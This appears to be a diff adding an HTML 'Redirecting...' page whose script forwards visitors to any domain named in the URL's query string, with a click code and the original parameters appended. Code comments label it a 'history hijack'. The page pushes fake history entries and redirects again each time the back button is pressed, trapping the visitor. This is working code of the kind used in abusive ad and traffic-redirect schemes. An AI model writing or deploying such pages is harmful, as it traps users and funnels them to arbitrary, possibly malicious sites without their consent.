@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+    }
+  </style>
+</head>
+
+<body>
+  <h2>Wait while redirecting...</h2>
+
+  <script>
+    /******** SETTINGS ********/
+    const CLICK_CODE = "wen25tvh";   // change if needed
+    const REDIRECT_DELAY = 800;      // ms
+
+    /******** TRACKING ********/
+    function track(event) {
+      console.log("[TRACK]", event);
+    }
+
+    /******** REDIRECT URL ********/
+    function buildRedirectUrl() {
+      const url = new URL(window.location.href);
+      const domain = url.searchParams.get("domain");
+      const z = url.searchParams.get("z");
+
+      if (!domain || !z) {
+        return "https://google.com";
+      }
+
+      return `https://${domain}/${CLICK_CODE}/${z}${url.search}`;
+    }
+
+    const redirectUrl = buildRedirectUrl();
+
+    /******** PAGE LOAD ********/
+    track("page_load");
+
+    // history hijack
+    history.pushState({ trapped: true }, "", location.href);
+
+    // initial redirect
+    setTimeout(() => {
+      track("redirect_page_load");
+      window.location.replace(redirectUrl);
+    }, REDIRECT_DELAY);
+
+    /******** BACK BUTTON ********/
+    window.addEventListener("popstate", function () {
+      track("back_button");
+
+      history.pushState({ trapped: true }, "", location.href);
+
+      setTimeout(() => {
+        track("redirect_back");
+        window.location.replace(redirectUrl);
+      }, 300);
+    });
+  </script>
+</body>
+</html>
